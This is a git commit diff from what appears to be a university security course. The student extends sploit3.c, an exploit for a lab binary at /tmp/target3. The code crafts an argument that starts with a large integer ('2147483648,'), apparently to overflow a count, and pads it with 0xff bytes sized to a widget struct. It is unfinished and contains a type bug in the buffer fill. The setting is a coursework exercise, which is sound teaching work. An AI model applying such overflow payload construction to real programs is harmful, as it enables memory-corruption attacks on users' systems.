c555cae4a23d60f7afdee3c4d81d5cc0b115d891
Nick Kantor <nick.kantor@utexas.edu>
2016-03-25 11:25:17 -0500

    Added sploit3 changes

--- proj2-files/sploits/sploit3.c
+++ proj2-files/sploits/sploit3.c
@@ -6,14 +6,36 @@
 
 #define TARGET "/tmp/target3"
 
+// need 2800
+// sizeof widget_t is 56 bytes
+// butts
+
+struct widget_t {
+  long double p;
+  double x;
+  double y;
+  unsigned long a;
+  unsigned long b;
+  int count;
+  double t;
+  double q;
+};
+
 int main(void)
 {
   char *args[3];
   char *env[1];
-
-  args[0] = TARGET; args[1] = "...Because I'M A POTATO!"; args[2] = NULL;
+  char buf[3000] = "2147483648,";
+  int i = 0;
+  for (i; i < 56*50; i++){
+  	int x = 11+i;
+  	buf[x] = "\xff";
+  }
+  args[0] = TARGET;
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
-
+  printf("%d\n",sizeof(struct widget_t));
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
